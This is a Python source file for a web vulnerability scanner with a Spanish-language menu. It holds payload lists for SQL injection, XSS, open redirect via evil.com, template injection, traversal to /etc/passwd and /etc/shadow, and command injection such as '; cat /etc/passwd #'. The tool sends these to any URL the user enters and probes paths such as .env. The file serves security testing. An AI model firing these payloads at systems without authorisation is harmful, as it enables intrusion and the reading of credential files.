"""Vulnerability scanner: SQLi, XSS, Open Redirect, SSTI, Path Traversal"""
from tools.base import *

PAYLOADS_SQLI = [
    "'", "\"", "';", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--", "' AND 1=1--",
    "'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--",
    "admin'--", "1' ORDER BY 1--", "1' AND 1=1 UNION SELECT 1,2,3--",
]
PAYLOADS_XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>", "';alert(1);//",
    "<svg onload=alert(1)>", "<body onload=alert(1)>",
    "javascript:alert(1)", "<ScRiPt>alert(1)</sCrIpT>",
]
PAYLOADS_REDIRECT = [
    "//evil.com", "https://evil.com/test", "//evil.com%2f@",
    "///evil.com", "//evil.com/", "https:evil.com",
]
PAYLOADS_SSTI = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}",
    "${7*'7'}", "{{''.__class__.__mro__}}",
]
PAYLOADS_TRAVERSAL = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc/passwd", "....//....//etc/passwd",
    "../../../../etc/shadow", "..\\..\\..\\..\\boot.ini",
]
PAYLOADS_CMD = [
    "; id", "| id", "`id`", "$(id)", "& ping -c 1 127.0.0.1 &",
    "| ping -n 1 127.0.0.1", "'; cat /etc/passwd #",
]

VULN_HEADERS = {
    "Missing X-XSS-Protection": "x-xss-protection",
    "Missing X-Frame-Options": "x-frame-options",
    "Missing X-Content-Type-Options": "x-content-type-options",
    "Missing Content-Security-Policy": "content-security-policy",
    "Missing Strict-Transport-Security": "strict-transport-security",
    "Server header leak": "server",
    "Missing Referrer-Policy": "referrer-policy",
    "Missing Permissions-Policy": "permissions-policy",
}

class VulnerabilityScanner:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.findings = []

    def add(self, vuln_type, detail, payload="", severity="medium"):
        self.findings.append({"type": vuln_type, "detail": detail, "payload": payload, "severity": severity})

    def test_param(self, param, payloads, vuln_type):
        for payload in payloads:
            try:
                sep = "&" if "?" in self.url else "?"
                target = f"{self.url}{sep}{param}={urllib.parse.quote(payload)}"
                req = urllib.request.Request(target, headers={"User-Agent": UA})
                with urllib.request.urlopen(req, timeout=8) as r:
                    html = r.read().decode("utf-8", errors="ignore")
                    if payload in html or urllib.parse.quote(payload) in html:
                        self.add(vuln_type, f"Parametro '{param}' reflejado", payload, "high")
                        return True
            except urllib.error.HTTPError as e:
                if e.code in (500, 400):
                    self.add(vuln_type, f"Parametro '{param}' -> HTTP {e.code}", payload, "medium")
            except: pass
        return False

    def test_form(self, payloads, vuln_type):
        html = ""
        try:
            req = urllib.request.Request(self.url, headers={"User-Agent": UA})
            with urllib.request.urlopen(req, timeout=10) as r:
                html = r.read().decode("utf-8", errors="ignore")
        except: return
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html, re.I)
        if forms and inputs:
            for inp in inputs[:5]:
                for payload in payloads[:3]:
                    try:
                        target = urllib.parse.urljoin(self.url, forms[0])
                        data = urllib.parse.urlencode({inp: payload}).encode()
                        req = urllib.request.Request(target, data=data, headers={"User-Agent": UA})
                        with urllib.request.urlopen(req, timeout=8) as r:
                            resp_html = r.read().decode("utf-8", errors="ignore")
                            if payload in resp_html:
                                self.add(vuln_type, f"Form input '{inp}' reflejado", payload, "high")
                    except: pass

    def check_headers(self):
        try:
            req = urllib.request.Request(self.url, method="HEAD", headers={"User-Agent": UA})
            with urllib.request.urlopen(req, timeout=10) as r:
                for name, header in VULN_HEADERS.items():
                    if header not in {k.lower(): v for k, v in r.headers.items()}:
                        self.add("Missing Security Header", name, "", "low")
        except: pass

    def check_paths(self):
        paths = ["admin", "phpinfo.php", ".env", "backup", "wp-admin", "xmlrpc.php",
                 "debug", "test", "api", "graphql", "server-status", "console"]
        for path in paths:
            try:
                req = urllib.request.Request(f"{self.url}/{path}", headers={"User-Agent": UA})
                with urllib.request.urlopen(req, timeout=5) as r:
                    if r.status == 200:
                        self.add("Exposed Path", f"Path accesible: /{path}", "", "medium")
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    self.add("Exposed Path", f"Path bloqueado (403): /{path}", "", "low")
            except: pass

    def scan(self):
        self.check_headers()
        self.check_paths()
        params = re.findall(r'[?&](\w+)=', self.url)
        if params:
            for p in params:
                self.test_param(p, PAYLOADS_SQLI, "SQLi")
                self.test_param(p, PAYLOADS_XSS, "XSS")
                self.test_param(p, PAYLOADS_REDIRECT, "Open Redirect")
                self.test_param(p, PAYLOADS_SSTI, "SSTI")
                self.test_param(p, PAYLOADS_TRAVERSAL, "Path Traversal")
                self.test_param(p, PAYLOADS_CMD, "Command Injection")
        self.test_form(PAYLOADS_XSS, "XSS (form)")

def menu_sqli():
    limpiar(); barra_menu("VULNERABILITY SCANNER")
    url = input(f"  {R2}URL a escanear{RS} > ").strip()
    if not url: return pausa()
    if not url.startswith("http"): url = "https://" + url

    print(f"\n  {D}[+] Escaneando {url}...{RS}\n")
    sp = Spinner("Analizando vulnerabilidades"); sp.start()
    scanner = VulnerabilityScanner(url)
    scanner.scan()
    sp.stop()

    if not scanner.findings:
        print(f"  {R1}[+] No se detectaron vulnerabilidades evidentes{RS}")
    else:
        severidad = {"high": f"{R1}HIGH{RS}", "medium": f"{R2}MEDIUM{RS}", "low": f"{D}LOW{RS}"}
        print(f"  {R2}{'SEVERIDAD':<10} {'TIPO':<20} {'DETALLE'}{RS}")
        print(f"  {'─' * 70}")
        for f in scanner.findings:
            sev = severidad.get(f["severity"], f["severity"])
            tipo = f["type"][:18]
            print(f"  {sev:<10} {W}{tipo:<20}{RS} {D}{f['detail'][:50]}{RS}")

        opc = input(f"\n  {R2}Exportar? (J=JSON, H=HTML, N=no) [N]{RS} > ").strip().upper()
        domain = re.sub(r'https?://', '', url).split('/')[0]
        if opc == "J":
            path = exportar_json(f"vuln_{domain}.json", scanner.findings)
            print(f"  {R1}[+] Guardado en {path}{RS}")
        elif opc == "H":
            cols = ["Severidad", "Tipo", "Detalle", "Payload"]
            filas = [[f["severity"].upper(), f["type"], f["detail"][:60], f["payload"][:40]] for f in scanner.findings]
            path = exportar_html(f"vuln_{domain}.html", f"Vulnerabilidades: {domain}", cols, filas)
            print(f"  {R1}[+] Reporte HTML en {path}{RS}")
    pausa()
